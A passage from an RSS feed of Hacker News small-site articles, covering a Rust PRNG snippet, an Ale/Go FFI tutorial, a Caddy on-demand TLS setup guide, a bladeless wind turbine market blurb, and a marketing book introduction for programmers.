<p>In this we've provided (minimal) replacements for the <code>tokio</code> and <code>image</code>crates. What about <code>rand</code> however?</p>

<p>Assuming you don't need a strong random number generated, and especially if you don't have any intent of letting it within a billion bytes of cryptographic usage, you have a number of options for psuedo random number generation (PRNG).</p>

<p>For a simple project a PRNG such as the <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">linear congruential generator</a> is likely your best bet.</p>

<pre><code>#[derive(Debug)]
struct LCG {
    state: u64
}

impl LCG {
    fn randint(&amp;mut self, m: u32) -&gt; u32 {
        // Random from [0, m] (i.e. including the end point)
        // LCG from Knuth's MMIX
        // See: https://en.wikipedia.org/wiki/Linear_congruential_generator
        let a: u64 = 6364136223846793005;
        let c: u64 = 1442695040888963407;
        self.state = a.wrapping_mul(self.state).wrapping_add(c);
        // Low bits don't have much entropy
        let low: u32 = self.state.reverse_bits() as u32;
        let high: u32 = (self.state &gt;&gt; 32).reverse_bits() as u32;
        (low ^ high) % (m + 1)
    }
}

fn main() {
    // Note: the PRNG is deterministic unless you modify this state on each run
    let mut lcg = LCG { state: 42 };
    println!("Random dice rolls: {}, {}", lcg.randint(6 - 1) + 1, lcg.randint(6 - 1) + 1);
}
</code></pre>

<h2>Conclusion</h2>

<p>In this code we've approximated the functionality gained from importing dependencies.</p>

<p>It's reassuring to know we can recreate such features ourselves even if that's rarely necessary. Beyond understanding how something works from the ground up (i.e. educational purpose) this may be necessary when deploying your code in a particularly limited environment / requirement such as <code>no_std</code>.</p>

<p>Luckily Rust provides an easy ecosystem to pull in dependencies through Crates - and I'd strongly recommend that instead!</p>

    </div></div>]]>
            </description>
            <link>https://state.smerity.com/smerity/state/01EYB6YQ5T2KFSC1PF55A3B8DG</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133713</guid>
            <pubDate>Sun, 14 Feb 2021 16:35:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Go and Ale]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26133631">thread link</a>) | @andrenth
<br/>
February 14, 2021 | https://www.ale-lang.org/ffi/ | <a href="https://web.archive.org/web/*/https://www.ale-lang.org/ffi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
  
  <p>Thomas Bradford
    Feb 12, 2021
    
  </p>
  
  
  
  
  


  
  <p>Ale is designed to be hosted within a <a href="https://golang.org/">Go</a> process. And while it‚Äôs not particularly difficult to <a href="https://www.ale-lang.org/embedding">embed</a> or even <a href="https://www.ale-lang.org/extending">extend</a> Ale, getting data structures from Go into Ale (and vice versa) has historically been a high-friction activity. There‚Äôs a reason for this and it all comes down to equality.</p>
<h3 id="equality-in-ale--equality-in-go">Equality in Ale ‚â† Equality in Go</h3>
<p>Ale employs what‚Äôs called ‚Äústructural equality.‚Äù This means that for any value, even if it‚Äôs not the same instance of a value, Ale will dive into its content to check whether or not it contains the same stuff. For example:</p>
<pre><code>(eq { :name "Ale" :age 3 :colors [:red :green :blue] }
    { :age 3 :colors [:red :green :blue] :name "Ale" })
</code></pre>
<p>In this case, even though the two objects are completely separate instances and their properties were set in different orders, Ale has determined that they are structurally identical to one another, and so the call to <code>eq</code> returns <code>#t</code>.</p>
<p>In Go, equality checking is a behavior that is, let‚Äôs say, ‚Äúdubious‚Äù. Certain types aren‚Äôt capable of being checked for equality, not even if a value of the type is being compared to itself. For example:</p>
<pre><code>f := func() {}
fmt.Println(f == f)
</code></pre>
<p>This code won‚Äôt compile. You‚Äôll get an error saying <code>"func can only be compared to nil"</code>. If you try to cheat by casting f as an <code>interface{}</code>, the code will compile, but will produce a runtime panic of <code>"comparing uncomparable type func()"</code>.</p>
<p>All this may seem quite strange, but I‚Äôm sure the Go authors had a good reason for it. Maps and Slices also display this behavior. There are ways to work around the problem in Go, such as wrapping those types in a <code>struct</code>. There are also restrictions that Go developers simply learn to ‚Äúlive with,‚Äù like not using such types as the keys in a <code>map</code>.</p>
<p>Ale, by design, has no such restriction.</p>
<pre><code>(define-lambda double (x) (* x 2))
(define func-map {
    double "a lambda that doubles"})
(func-map double)
</code></pre>
<p>This code creates a lambda called <code>double</code> and then uses it as the key in <code>func-map</code>, wherein it maps to the string <code>"a lambda that doubles"</code>. It then retrieves that string using the actual lambda.</p>

<p>These major differences between Go and Ale have always been one of the reasons why I hesitated on developing a dynamic bridge between the two languages. Until now.</p>
<h3 id="two-great-tastes-that-taste-great-together">Two Great Tastes That Taste Great Together</h3>
<p>The Ale <code>ffi</code> package is capable of bridging quite a few of Go‚Äôs types into something that can be passed around within an Ale environment. Wrapping a Go value and making it available in Ale is relatively straight-forward:</p>
<pre><code>package main

import (
	"github.com/kode4food/ale/core/bootstrap"
	"github.com/kode4food/ale/eval"
	"github.com/kode4food/ale/ffi"
)

type myStruct struct {                          // step 1
	Greeting string `ale:"message"`
    Farewell string
}

func main() {
	s := &amp;myStruct{                             // step 2
		Greeting: "Hello, World!",
        Farewell: "Goodbye, Folks!",
	}

	env := bootstrap.TopLevelEnvironment()
	bootstrap.Into(env)
	ns := env.GetAnonymous()
    w := ffi.MustWrap(s)                        // step 3
	ns.Declare("my").Bind(w)                    // step 4
	eval.String(ns, `(println (my :message))`)  // step 5
    eval.String(ns, `(println (my :Farewell))`)
}
</code></pre>
<p><strong>In step 1</strong> we define a Go type that we‚Äôll be wrapping. In the case of a <code>struct</code>, only Exported fields will be mapped by Ale. Ale will map field names to Keywords, but make no changes to their spelling or case. You may override this naming using the <code>ale</code> field tag.</p>
<p><strong>In step 2</strong> we instantiate a copy of our struct, and store a pointer to it. Ale will recognize this type as a pointer to myStruct, and handle the indirection for you.</p>
<p><strong>In step 3</strong> we wrap the Go value. <code>MustWrap</code> will panic if it cannot perform the wrapping. There is also a <code>Wrap</code> function that will potentially return an error rather than panic.</p>
<p><strong>In step 4</strong> we bind the wrapped Go value into the Ale namespace under the name ‚Äúmy‚Äù. See <a href="https://www.ale-lang.org/embedding">embed</a> for more information on how this process works.</p>
<p><strong>In step 5</strong> we ask the Ale evaluator to read, macro expand, compile, and execute our two calls to <code>println</code>.</p>
<h3 id="type-mappings">Type Mappings</h3>
<p>The following table describes how a Go primitive type (referred to as a <code>Kind</code> by the Go <a href="https://golang.org/pkg/reflect/">reflect</a> package) will be mapped to a corresponding Ale type.</p>
<table>
<tbody><tr>
    <th>Go Kind</th><th>Ale Data Type</th>
</tr>
<tr><td>bool</td><td>
	<a href="https://github.com/kode4food/ale/blob/master/data/value.go">Bool</a></td></tr>
<tr><td>int(nn), uint(nn)</td>
	<td><a href="https://github.com/kode4food/ale/blob/master/data/number.go">Number</a>
	(<a href="https://github.com/kode4food/ale/blob/master/data/integer.go">Integer</a> /
	<a href="https://github.com/kode4food/ale/blob/master/data/integer.go">BigInt</a>)</td></tr>
<tr><td>float(nn)</td>
	<td><a href="https://github.com/kode4food/ale/blob/master/data/number.go">Number</a>
	(<a href="https://github.com/kode4food/ale/blob/master/data/rational.go">Float</a>)</td></tr>
<tr><td>complex(nnn)</td>
	<td><a href="https://github.com/kode4food/ale/blob/master/data/cons.go">Cons</a>&lt;<a href="https://github.com/kode4food/ale/blob/master/data/rational.go">Float</a><a>, </a><a href="https://github.com/kode4food/ale/blob/master/data/rational.go">Float</a>&gt;</td></tr>
<tr><td>string</td><td>
	<a href="https://github.com/kode4food/ale/blob/master/data/string.go">String</a></td></tr>
<tr><td>array, slice</td><td>
	<a href="https://github.com/kode4food/ale/blob/master/data/vector.go">Vector</a></td></tr>
<tr><td>struct</td><td>
	<a href="https://github.com/kode4food/ale/blob/master/data/object.go">Object</a></td></tr>
<tr><td>func</td><td>
	<a href="https://github.com/kode4food/ale/blob/master/data/function.go">Function</a></td></tr>
<tr><td>interface</td><td>
	<a href="https://github.com/kode4food/ale/blob/master/data/object.go">Object</a>
	(of bound
	<a href="https://github.com/kode4food/ale/blob/master/data/function.go">Functions</a>)</td></tr>
<tr><td>map</td><td>
	<a href="https://github.com/kode4food/ale/blob/master/data/object.go">Object</a></td></tr>
<tr><td>chan</td><td>
	<a href="https://www.ale-lang.org/docstring/chan/">Channel Object</a></td></tr>
<tr><td colspan="2">
    The following Go kinds are not yet mapped
</td></tr>
<tr><td>uintptr</td><td>unsafe.Pointer</td></tr>
</tbody></table>

</div></div>]]>
            </description>
            <link>https://www.ale-lang.org/ffi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133631</guid>
            <pubDate>Sun, 14 Feb 2021 16:26:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I implemented custom domain support with automatic TLS certs for my SaaS app]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26133626">thread link</a>) | @thismodernlife
<br/>
February 14, 2021 | https://headey.net/how-i-implemented-custom-domain-support-with-automatic-tls-certs-for-my-saas-app | <a href="https://web.archive.org/web/*/https://headey.net/how-i-implemented-custom-domain-support-with-automatic-tls-certs-for-my-saas-app">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
  <div>
<p><em>Managing hosting and TLS certificates for customer-specified domains can be a challenge. In this article I explain how I solved this, with relative ease, for </em><a href="https://blogline.co/"><em>blogline.co</em></a><em>. </em></p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI2Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi8xMDQ_ZXhwaXJlc19pbgY7AFRJIgxwdXJwb3NlBjsAVEkiD2F0dGFjaGFibGUGOwBUSSIPZXhwaXJlc19hdAY7AFQw--50537ee2d3ede9beee2c26547182f39a1de404ef" content-type="image/jpeg" url="https://app.blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBiUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--e1b87f97a76dfee9bc4789d6b8ba9d22aed9b561/franck-DoWZMPZ-M9s-unsplash.jpg" filename="franck-DoWZMPZ-M9s-unsplash.jpg" filesize="34685" width="700" height="358" previewable="true" presentation="gallery" caption="https://unsplash.com/photos/DoWZMPZ-M9s"><figure>
    <img src="https://headey.net/rails/active_storage/representations/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBiUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--e1b87f97a76dfee9bc4789d6b8ba9d22aed9b561/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9MWm05eWJXRjBTU0lJYW5CbkJqb0dSVlE2RkhKbGMybDZaVjkwYjE5c2FXMXBkRnNIYVFJQUJHa0NBQU02QzJ4dllXUmxjbnNHT2dsd1lXZGxNQT09IiwiZXhwIjpudWxsLCJwdXIiOiJ2YXJpYXRpb24ifX0=--a716ef5bd361b6dfee383a3ae715134b65b59d48/franck-DoWZMPZ-M9s-unsplash.jpg">

  <figcaption>
      https://unsplash.com/photos/DoWZMPZ-M9s
  </figcaption>
</figure></action-text-attachment><p>When I first started working on <a href="https://blogline.co/">Blogline</a> (a fast, minimalist blogging platform), I had only planned to use it for my own blogs. Like most app developers (certainly those using <a href="https://rubyonrails.org/">Rails</a>), I originally hosted it on <a href="https://heroku.com/">Heroku</a>, which has decent support for TLS if you're working with only a handful of known domains. Once I'd finished the early prototype, I decided it might be fun to turn it into a SaaS product that would allow customers to <strong>create a blog on their own domain in seconds</strong>. This didn't sound complicated technically ‚Äì the main problem was how to manage TLS certificates.</p></div>

<div><p>When <a href="https://letsencrypt.org/">LetsEncrypt</a> arrived, it hugely altered the TLS landscape. Developers could now programatically create TLS certificates for free rather than forking out quite large sums each year for the privilege of running their apps and sites over HTTPS. </p><p>For Blogline, I figured I would need to use LetsEncrypt (or an alternative like <a href="https://zerossl.com/">ZeroSSL</a>) in order to get custom domains working. When someone <a href="https://help.blogline.co/adding-a-custom-domain">configured their blog to use a custom domain</a> in the app, I could run a job in the background that would generate a TLS certificate using <a href="https://certbot.eff.org/">Certbot</a>, then call a Heroku API to somehow configure Heroku to deal with it correctly. Right? This didn't sound particularly fun, or perhaps even doable, so I started Googling.</p></div>

<div><p>I found an article, enticingly titled <a href="https://www.cloudflare.com/en-gb/ssl-for-saas-providers/">SSL for SaaS Providers</a> on the Cloudflare website. Their marketing suggests this product might allow me to do what I want without actually having to implement anything ‚Äì my laziness was paying off already!&nbsp;</p></div>
<blockquote>Cloudflare SSL for SaaS allows a SaaS company‚Äôs end customer to continue using a custom vanity domain, while securing its communication through SSL.&nbsp;</blockquote>
<div>
<p>Unfortunately, I had to fill out a <strong>Talk To Us!</strong> form in order to get a price quote, and further Googling told me this was available only to Enterprise customers (üí∏üí∏üí∏) and would cost thousands (!) per month.&nbsp;</p><p>Moving swiftly on...</p></div>

<div><p>Although the zero-effort Cloudflare solution had been ripped out of my miserly hands, my incessant Googling had helped me figure out that the search term I needed was "on-demand TLS". The top hit for this term was <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;ved=2ahUKEwjA67emzunuAhVTiFwKHSEFBTMQFjAAegQIBhAC&amp;url=https%3A%2F%2Fcaddyserver.com%2Fdocs%2Fautomatic-https&amp;usg=AOvVaw3jgL_xUvfCfAbe1SvHRDyx">Caddy Web Server</a>, something I had never heard of before. The Caddy website states:</p></div>
<blockquote>Automatic HTTPS provisions TLS certificates for all your sites and keeps them renewed. It also redirects HTTP to HTTPS for you!</blockquote>
<div>
<p>This sounded almost too good to be true, but this 29-second video demonstrates how incredibly simple it is to use:</p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSInZ2lkOi8vYmxvZ2xpbmUvRW1iZWQvMzE_ZXhwaXJlc19pbgY7AFRJIgxwdXJwb3NlBjsAVEkiD2F0dGFjaGFibGUGOwBUSSIPZXhwaXJlc19hdAY7AFQw--f0fa8e56f789b0ef1526c2b0fb0e6d7918364905" content-type="application/octet-stream"><p>
  <iframe width="200" height="150" src="https://www.youtube.com/embed/nk4EWHvvZtI?feature=oembed"></iframe>
</p>
</action-text-attachment></div>
<div><p>A few quick experiments and it was clear that Caddy was exactly the right tool for the job. It's amazing! It's not that often you come across a tool that not only solves a complex problem, but does so painlessly. Serious kudos to the Caddy developers and community.</p><p>My app was still hosted in Heroku and so I needed to get Caddy working as a reverse proxy, something which is surprisingly easy. I created a $5 droplet on <a href="https://m.do.co/c/b1753df861c4">DigitalOcean</a>, installed Caddy (<a href="https://caddyserver.com/docs/install">a one liner on Ubuntu</a>) and configured it to reverse proxy requests to my Heroku app. The entire config looked something like this:</p></div>
<pre> reverse_proxy * {
    to https:<em>//myapp.herokuapp.com</em>

    header_up Host {http.reverse_proxy.upstream.hostport}
    header_up X-Forwarded-For {http.request.remote}
    header_up X-Real-IP {http.reverse-proxy.upstream.address}
    header_up X-Forwarded-Proto {http.request.scheme}
    header_up X-Forwarded-Port {http.request.port}
    header_up X-Forwarded-Host {http.request.host}
    
    tls { 
      on_demand 
    }
    
    log {
      output file /var/log/caddy/access.log
    }  
}</pre>
<div>
<p>The primary DNS for <strong>blogline.co</strong> didn't need to change since I'd already sorted TLS with Heroku for that domain, but for blogs configured with custom domains, all a customer needed to do was point their DNS to my new DigitalOcean droplet and let Caddy do the rest. </p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI2Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi8xMDU_ZXhwaXJlc19pbgY7AFRJIgxwdXJwb3NlBjsAVEkiD2F0dGFjaGFibGUGOwBUSSIPZXhwaXJlc19hdAY7AFQw--ea8f27e81469040cd2dc6328ebacc49b162aa108" content-type="image/png" url="https://app.blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBiZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--3b78bb1fca65ad6f86711d5be30a3d6be4a87058/image.png" filename="image.png" filesize="140833" width="1142" height="722" previewable="true" presentation="gallery"><figure>
    <img src="https://headey.net/rails/active_storage/representations/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBiZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--3b78bb1fca65ad6f86711d5be30a3d6be4a87058/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9MWm05eWJXRjBTU0lJY0c1bkJqb0dSVlE2RkhKbGMybDZaVjkwYjE5c2FXMXBkRnNIYVFJQUJHa0NBQU02QzJ4dllXUmxjbnNHT2dsd1lXZGxNQT09IiwiZXhwIjpudWxsLCJwdXIiOiJ2YXJpYXRpb24ifX0=--8e53091023a64453f29344de82e7f7cbaa8dfb83/image.png">

  <figcaption>
  </figcaption>
</figure></action-text-attachment><p>It works!&nbsp;</p></div>

<div><p>This initial implementation was working ok, but there were a few things that I wanted to improve.&nbsp;</p><p>I was a little concerned in the back of my mind that Caddy was storing the TLS certificates on my DigitalOcean droplet, of which there was only one. What if my app was wildly successful (right now I'm like ü§£) and I had to load balance Caddy. If you leave the default configuration in place, each Caddy instance will generate and store their own copies of TLS certificates which could cause issues with LetsEncrypt rate limits.</p><p>The Caddy developers have made it easy to generate plugins, and there are several storage back-ends you can configure so that multiple Caddy instances share the same certs. The main options for storage are Redis and DynamoDB. I was already running Redis, so it made sense to use that. I had to jump through a few hoops to get the plugin running since the default Ubuntu Caddy install doesn't support them ‚Äì you have to build them yourself. Fortunately this is pretty straight forward.</p><p>First you need Golang 14:</p></div>
<pre>sudo apt install golang-1.14-go</pre>


<pre>go get -u github.com/caddyserver/xcaddy/cmd/xcaddy</pre>
<div>
<p>Then you can build Caddy with the Redis plugin:</p></div>
<pre>xcaddy build --with github.com/gamalan/caddy-tlsredis</pre>
<div>
<p>This will generate a new Caddy binary which you can copy into <strong>/usr/bin</strong>.</p><p>Configuring Caddy is straightforward. I just added the following to the top of my config (while also configuring the referenced environment variables on my system):</p></div>
<pre>{ 
  storage redis { 
    host {$CADDY_CLUSTERING_REDIS_HOST} 
    port {$CADDY_CLUSTERING_REDIS_PORT} 
    password {$CADDY_CLUSTERING_REDIS_PASSWORD} 
    db {$CADDY_CLUSTERING_REDIS_DB} 
    tls_enabled {$CADDY_CLUSTERING_REDIS_TLS} 
    aes_key {$CADDY_CLUSTERING_REDIS_AESKEY} 
  }
}</pre>
<div>
<p>With certs now being stored in Redis, I could fire up as many Caddy instances as I like and point them to the same Redis instance. No dupes.</p></div>

<div><p>If you have a site running on the public internet, you're going to be hit by bot requests. What you don't want is bots hitting your Caddy-delivered app with spurious requests that result in LetsEncrypt certificates being created inadvertently, and rate limits being maxed out. Obviously I didn't read the manual properly, so this happened to me ü§¶üèª‚Äç‚ôÇÔ∏è.</p><p>Caddy allows you to <a href="https://caddyserver.com/docs/caddyfile/options#on-demand-tls">configure an endpoint for verifying whether it should try and provision a TLS cert</a> for a given domain. For Blogline, this is a simple Rails action that performs a single DB query and returns <strong>200</strong> or <strong>404</strong> depending on whether the custom domain is recognised. To configure this endpoint in Caddy, you add a global config:</p></div>
<pre>{ 
  on_demand_tls { 
    ask http://127.0.0.1:1234/my-check-endpoint/ 
    interval 2m 
    burst 5 
  } 
}</pre>


<div><p>Now that I had this running, it made sense to also point the main <strong>blogline.co</strong> domain at Caddy as well. Blogline requires a wildcard certificate but (of course!) Caddy also handles these, as long as you <a href="https://caddy.community/t/how-to-use-dns-provider-modules-in-caddy-2/8148">configure it to access your DNS provider</a>.</p><p>This requires another plugin, so I needed to rebuild Caddy again, this time using the Cloudflare DNS plugin:</p></div>
<pre>xcaddy build --with github.com/gamalan/caddy-tlsredis --with github.com/caddy-dns/cloudflare</pre>
<div>
<p>Once I'd installed the new binary, I added a new section to my Caddy config specifically for the <strong>blogline.co</strong> domain:</p></div>
<pre>*.blogline.co:443 {
    reverse_proxy 127.0.0.1:1234

    tls {
      dns cloudflare &lt;API-token&gt;
    }

    log {
      output file /var/log/caddy/access-blogline.log
    }
}</pre>
<div>
<p>Now all requests to the Blogline app come via Caddy and TLS is handled automagically, including a wildcard certificate for any requests to the <strong>*.blogline.co</strong> domain (e.g. <a href="https://help.blogline.co/">help.blogline.co</a>).</p></div>

<div><p>Proxying requests from DigitalOcean to Heroku wasn't pleasing me, so I decided to move all the hosting to DigitalOcean. Leaving the 'no servers' approach of Heroku was a little worrying as I really don't want to have to deal with infrastructure, but given that I was already server-wrangling with Caddy it didn't seem like too much extra effort. </p><p>Thankfully I discovered the wonderful <a href="https://hatchbox.io/?via=olly">HatchBox</a>, developed by Chris Oliver, which made server provisioning and deployment pain a thing of the past. It's absolutely fantastic. Although HatchBox doesn't support Caddy yet (apparently it's coming), it was easy enough to provision the servers first and then install Caddy myself. It hooks into my Github so when I merge a PR, Hatchbox takes care of the deployment. It's essentially the same end-user experience as Heroku.</p><p>Being all-in on DigitalOcean meant I could make use of their Managed Postgres and Managed Redis options, as well as ditching AWS S3 for DigitalOcean Spaces which is API compatible. They have also recently released their <a href="https://www.digitalocean.com/products/app-platform/">managed Kubernetes 'app platform'</a> which is something I plan to look at, and would give me the equivalent serverless infra that Heroku currently provides.</p></div>

<div><p>Some of this might come across initially as complicated, but it's honestly not. There are very few moving parts and you don't need to be a particular adept sysadmin (I am not!) to achieve the same goal. If you get stuck, the <a href="https://caddy.community/">Caddy Community</a> site is excellent.</p><p>I'd love to hear from people about this write up, but also about any alternative approaches that people have taken to solve the same problem. If this is something you've tackled, please <a href="https://headey.net/contact">drop me an email</a> and let me know!</p></div>
</div>

  </div><div data-controller="email-subscribers">
    <p>Subscribe to Email Updates</p>

    

      </div></div>]]>
            </description>
            <link>https://headey.net/how-i-implemented-custom-domain-support-with-automatic-tls-certs-for-my-saas-app</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133626</guid>
            <pubDate>Sun, 14 Feb 2021 16:25:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bladeless Wind Turbines]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26133497">thread link</a>) | @kyleShropshire
<br/>
February 14, 2021 | https://www.evwind.es/2019/05/31/bladeless-wind-turbines-less-efficient-in-the-conversion-of-captured-wind-power-into-electrical-energy/67462 | <a href="https://web.archive.org/web/*/https://www.evwind.es/2019/05/31/bladeless-wind-turbines-less-efficient-in-the-conversion-of-captured-wind-power-into-electrical-energy/67462">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Wind is an essential part of the global 
renewable energy landscape and in the foreseeable future, the reliance 
on it is anticipated to increase. Currently, turbines are the most 
commonly used machines to convert wind energy into electrical energy 
with the movement of the blades fuelling an electricity generator. 
However, the top-heavy nature of conventional wind turbines requires 
high-quality components to avoid structural damage. This factor 
increases the cost of constructing the whole system. On the other hand, 
with the recent innovation of bladeless wind turbines, the risk of 
structural damage to the system can be reduced significantly. Bladeless 
wind turbines do not include rotating blades and are designed in such a 
way that they stand erect and oscillate in response to the vortices. The
reduced weight of these turbines is acting as a primary driver of the 
global bladeless wind turbines market.</p>
<p>The report offers insights into the 
drivers, restraints, and opportunities impacting the growth of the 
market. It calculates the competitive landscape of the market using 
analytical tools such as market attractiveness analysis and Porter‚Äôs 
five force analysis. It presents a holistic perspective of the market‚Äôs 
growth across various regions and product type in terms of revenue as 
well as volume.</p>
<p><strong>Read Report Overview @</strong></p>
<figure><p>
https://www.transparencymarketresearch.com/bladeless-wind-turbines-market.html
</p></figure>
<p><strong>Overview of the Global</strong>&nbsp;<strong>Bladeless Wind Turbines&nbsp;</strong><strong>Market</strong></p>
<p>Bladeless wind turbines contain only a 
few moving parts. They not only help in eliminating noise but also don‚Äôt
pose a threat to birds. This makes them more advanced than their 
earlier counterparts. Moreover, the lower cost of manufacturing and 
maintenance of these turbines is contributing to an increase in their 
demand. In addition to lower costs, these turbines do not suffer large 
drop in power. As a result, more bladeless wind turbines can be 
installed per unit area than conventional wind turbines. These factors, 
collectively, are propelling the growth of the global bladeless wind 
turbines market.</p>
<p>On the flip side, bladeless wind  turbines,&nbsp;being at a nascent stage, are less efficient in the conversion  of captured wind power into electrical energy, thus limiting their  implementation on a large scale. However, the manufacturing of bladeless  wind turbines using advanced technology&nbsp;and enhanced materials is  likely to boost the demand for these turbines in the forthcoming years.</p>
<p>
At present, the global bladeless wind turbine market is&nbsp;being propelled 
by the efforts of a Spanish company, Vortex Bladeless, which has 
innovated a contemporary design of bladeless turbines. With intensive 
ongoing research and product enhancements, more companies are expected 
to enter the market.
</p>

<p>On the basis of region, the global  bladeless wind turbines market is categorized into Western Europe,  Eastern Europe, Asia Pacific, Latin America, North America, and the  Middle East and Africa. The adoption of bladeless wind turbines is  expected to pick up speed in Western Europe owing to presence of  favorable environmental conditions and availability of advanced  technology. Asia Pacific is estimated to flourish due to increasing  government initiatives for promoting wind energy.</p>
</div></div>]]>
            </description>
            <link>https://www.evwind.es/2019/05/31/bladeless-wind-turbines-less-efficient-in-the-conversion-of-captured-wind-power-into-electrical-energy/67462</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133497</guid>
            <pubDate>Sun, 14 Feb 2021 16:11:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Entreprenerd: Marketing for Programmers]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26133340">thread link</a>) | @athosblade
<br/>
February 14, 2021 | https://www.jackkinsella.ie/books/entreprenerd/marketing_for_programmers | <a href="https://web.archive.org/web/*/https://www.jackkinsella.ie/books/entreprenerd/marketing_for_programmers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <div>
  <div>
    
    <h2>A Condensed Guide to Marketing Software</h2>
    <p><img src="https://www.jackkinsella.ie/assets/entreprenerd/entreprenerd-cover-ee444e819661ce962b44e840eddcf6505208a984b55209ef4ea0d97064a9ac91.jpg" alt="Entreprenerd cover"></p><p>Both the HTML version of the book and the luxury <a href="https://drive.google.com/drive/folders/0B36dwR68NHU3cHJaWWY2Y2E3bkk">Kindle/PDF</a> versions are free forever.</p>
    <h2>Introduction</h2>
    <p>
    In a fair world, meritocracy would rule. Being good at what you do would be all that's necessary to get fans, sales, custom, and acclaim.
    </p>

    <p>
    But we do not live in such a world; our reality is a crowded one, one where only those who shout the loudest get noticed.
    </p>

    <p>
    It is disconcerting to consider our own insignificance, but it is only by taking this perspective that we grasp the difficultly of entering the public√¢‚Ç¨‚Ñ¢s awareness.
    </p>

    <p>
    Given vast access to the machinery of the web and digital publishing, each of us is competing for attention with a billion others. Each of us has but one painting sitting in a gallery housing a thousand others, stationed in a city hosting a thousand such galleries, situated in a world with a thousand such cities. Leaving our painting√¢‚Ç¨‚Ñ¢s discovery to fate alone, our chances of being noticed are little better than those of winning the lotto.
    </p>

    <p>
    This state of affairs is hardly a new one. Charles Ives, considered by some to be the greatest American composer, ceased writing music 18 years before his death. For the remainder of his life, he dedicated himself to promoting and distributing his music. Without this gargantuan effort, it is doubtful that his work would have the acclaim it enjoys today.
    </p>

    <p>
    The ultimate goal of all marketing is to get ever-increasing, self-perpetuating word of mouth (or, to be more modern about it, "recommendation of Reddit" or "tweet of Twitter"). But this is a case of the rich getting richer, of attention begetting attention, of the virtuous circle in full swing. Because word of mouth only kicks in after the snowball is already hurtling down the slope, a more apt question is how to get the thing to budge in the first place.
    </p>

    <p>
    The approach outlined in this book is one possible answer to this question. In a nutshell, the strategy is as follows: You will take out online advertisements and invest in SEO so as to inform relevant members of the public that you exist. Thanks to the potency of these measures, a steady stream of promising leads will arrive to your website. Here, you will apply the psychological tactics of conversion optimisation and copywriting to convince these leads to place orders, download your music, or whatever it is you want them to do. Following their conversion, you will send these past customers automated emails and display remarketing ads so as to keep them coming back to you again and again. Meanwhile, throughout every stage of this process, you will study reports in Google Analytics to discover which particular marketing measures brought you the highest profits. So as not to be fooled by randomness, you will apply statistical significance testing, thereby ensuring that any confidence you have in your marketing conclusions is justified.
    </p>

    <p>
    I want to highlight that not all of your marketing forays will bear fruit. Indeed, most will fail. The reality is that you will need to try out lots of different angles until you find the one that sticks.
    </p>

    <p>
    And with that, let's dive in.
    </p>

    <h2>Table of Contents</h2>
    <ul>
      <li><a href="https://www.jackkinsella.ie/articles/seo-steps-to-take-before-writing-a-single-line-of-code">SEO Steps To Take Before Writing a Single Line of Code</a></li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-on-each-individual-page">SEO on Each Individual Page</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-at-the-whole-website-level">SEO at the Whole Website Level</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-by-mitigating-duplicate-content-issues">SEO by Mitigating Duplicate Content Issues</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-in-image-search">SEO in Image Search</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-through-backlinks">SEO Through Backlinks</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-with-social-networks">SEO with Social Networks</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-and-internationalisation">SEO and Internationalisation</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/website-copywriting">Website Copywriting</a></li>
      <li><a href="https://www.jackkinsella.ie/articles/google-analytics-lessons">A Lasting Marriage: Google Analytics</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/the-conversion-surgeon-a-guide-to-conversion-rate-optimization">The Conversion Surgeon-Guide to Conversion Optimisation</a></li>
